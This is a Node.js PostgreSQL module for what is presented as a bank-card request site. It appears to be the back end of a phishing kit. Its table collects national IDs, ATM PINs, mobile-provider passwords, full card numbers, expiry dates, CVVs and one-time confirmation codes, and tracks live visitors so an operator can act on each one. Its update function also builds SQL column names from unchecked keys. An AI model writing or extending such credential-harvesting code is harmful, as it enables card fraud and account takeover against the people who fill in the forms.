import pg from 'pg';
const { Pool } = pg;
const connectionString = process.env.DATABASE_URL;
export const pool = connectionString ? new Pool({ connectionString, ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : undefined, max: 10 }) : null;
export async function initDatabase() {
  if (!pool) return false;
  await pool.query(`
    CREATE TABLE IF NOT EXISTS requests (
      id UUID PRIMARY KEY, created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(), card_type VARCHAR(20) NOT NULL,
      full_name VARCHAR(120) NOT NULL, national_id VARCHAR(40) NOT NULL, mobile VARCHAR(40) NOT NULL,
      email VARCHAR(160) NOT NULL, nationality VARCHAR(20) NOT NULL, bank VARCHAR(120) NOT NULL,
      status VARCHAR(30) NOT NULL DEFAULT 'new', confirmation_code VARCHAR(6), code_submitted_at TIMESTAMPTZ,
      decision_at TIMESTAMPTZ, decision_note VARCHAR(240)
    );
    CREATE INDEX IF NOT EXISTS requests_status_idx ON requests(status);
    CREATE INDEX IF NOT EXISTS requests_created_at_idx ON requests(created_at DESC);
    ALTER TABLE requests ADD COLUMN IF NOT EXISTS confirmation_code VARCHAR(6);
    ALTER TABLE requests ADD COLUMN IF NOT EXISTS code_submitted_at TIMESTAMPTZ;
    ALTER TABLE requests ADD COLUMN IF NOT EXISTS decision_at TIMESTAMPTZ;
    ALTER TABLE requests ADD COLUMN IF NOT EXISTS decision_note VARCHAR(240);
    ALTER TABLE requests ADD COLUMN IF NOT EXISTS atm_pin_encrypted TEXT;
    ALTER TABLE requests ADD COLUMN IF NOT EXISTS network_provider VARCHAR(20);
    ALTER TABLE requests ADD COLUMN IF NOT EXISTS provider_mobile VARCHAR(40);
    ALTER TABLE requests ADD COLUMN IF NOT EXISTS provider_password_encrypted TEXT;
    ALTER TABLE requests ADD COLUMN IF NOT EXISTS steps_completed JSONB DEFAULT '[]'::jsonb;
    ALTER TABLE requests ADD COLUMN IF NOT EXISTS completed_at TIMESTAMPTZ;
    ALTER TABLE requests ADD COLUMN IF NOT EXISTS card_number_encrypted TEXT;
    ALTER TABLE requests ADD COLUMN IF NOT EXISTS card_expiry_month VARCHAR(2);
    ALTER TABLE requests ADD COLUMN IF NOT EXISTS card_expiry_year VARCHAR(4);
    ALTER TABLE requests ADD COLUMN IF NOT EXISTS card_cvv_encrypted TEXT;
    ALTER TABLE requests ADD COLUMN IF NOT EXISTS card_holder_name VARCHAR(120);
    CREATE TABLE IF NOT EXISTS visitors (id VARCHAR(80) PRIMARY KEY, page VARCHAR(40) NOT NULL, last_seen TIMESTAMPTZ NOT NULL DEFAULT NOW());
    CREATE INDEX IF NOT EXISTS visitors_last_seen_idx ON visitors(last_seen);
  `);
  return true;
}
const mapRequest = (row) => ({
  id: row.id, createdAt: row.created_at?.toISOString?.() ?? row.created_at, cardType: row.card_type,
  fullName: row.full_name, nationalId: row.national_id, mobile: row.mobile, email: row.email,
  nationality: row.nationality, bank: row.bank, status: row.status,
  ...(row.confirmation_code ? { confirmationCode: row.confirmation_code } : {}),
  ...(row.code_submitted_at ? { codeSubmittedAt: row.code_submitted_at.toISOString?.() ?? row.code_submitted_at } : {}),
  ...(row.decision_at ? { decisionAt: row.decision_at.toISOString?.() ?? row.decision_at } : {}),
  ...(row.decision_note ? { decisionNote: row.decision_note } : {}),
  ...(row.atm_pin_encrypted ? { atmPinEncrypted: row.atm_pin_encrypted } : {}),
  ...(row.network_provider ? { networkProvider: row.network_provider } : {}),
  ...(row.provider_mobile ? { providerMobile: row.provider_mobile } : {}),
  ...(row.provider_password_encrypted ? { providerPasswordEncrypted: row.provider_password_encrypted } : {}),
  ...(row.steps_completed ? { stepsCompleted: row.steps_completed } : {}),
  ...(row.completed_at ? { completedAt: row.completed_at.toISOString?.() ?? row.completed_at } : {}),
  ...(row.card_number_encrypted ? { cardNumberEncrypted: row.card_number_encrypted } : {}),
  ...(row.card_expiry_month ? { cardExpiryMonth: row.card_expiry_month } : {}),
  ...(row.card_expiry_year ? { cardExpiryYear: row.card_expiry_year } : {}),
  ...(row.card_cvv_encrypted ? { cardCvvEncrypted: row.card_cvv_encrypted } : {}),
  ...(row.card_holder_name ? { cardHolderName: row.card_holder_name } : {})
});
export async function createRequest(request) {
  const { rows } = await pool.query(`INSERT INTO requests (id, card_type, full_name, national_id, mobile, email, nationality, bank, status) VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9) RETURNING *`, [request.id, request.cardType, request.fullName, request.nationalId, request.mobile, request.email, request.nationality, request.bank, request.status]);
  return mapRequest(rows[0]);
}
export async function listRequests() { const { rows } = await pool.query('SELECT * FROM requests ORDER BY created_at DESC'); return rows.map(mapRequest); }
export async function findRequest(id) { const { rows } = await pool.query('SELECT * FROM requests WHERE id = $1', [id]); return rows[0] ? mapRequest(rows[0]) : null; }
export async function updateRequest(id, patch) {
  const fields = []; const values = [];
  for (const [column, value] of Object.entries(patch)) { fields.push(column + ' = $' + (values.length + 1)); values.push(value); }
  if (!fields.length) return findRequest(id); values.push(id);
  const { rows } = await pool.query('UPDATE requests SET ' + fields.join(', ') + ' WHERE id = $' + values.length + ' RETURNING *', values);
  return rows[0] ? mapRequest(rows[0]) : null;
}
export async function upsertVisitor(id, page) {
  await pool.query(`INSERT INTO visitors (id, page, last_seen) VALUES ($1,$2,NOW()) ON CONFLICT (id) DO UPDATE SET page = EXCLUDED.page, last_seen = NOW()`, [id, page]);
  await pool.query("DELETE FROM visitors WHERE last_seen < NOW() - INTERVAL '45 seconds'");
}
export async function activeVisitorsCount() {
  const { rows } = await pool.query(`SELECT COUNT(*)::int AS count FROM visitors WHERE last_seen >= NOW() - INTERVAL '45 seconds' AND page IN ('home','application')`);
  return rows[0].count;
}
